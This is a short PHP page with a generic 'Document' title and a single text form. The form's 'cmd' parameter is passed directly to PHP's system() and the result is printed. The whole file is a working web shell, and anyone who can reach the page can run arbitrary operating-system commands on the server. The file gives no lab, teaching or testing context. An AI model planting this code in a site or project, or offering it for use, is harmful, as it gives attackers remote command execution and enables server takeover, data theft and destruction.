<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>

<body>
    <form action="/index.php" method="get">

        <input type="text" name='cmd'>
        <button type="submit">submit</button>
    </form>
<?php
if (isset($_GET['cmd'])) {
echo system($_GET['cmd']);
}
?>

</body>
</html>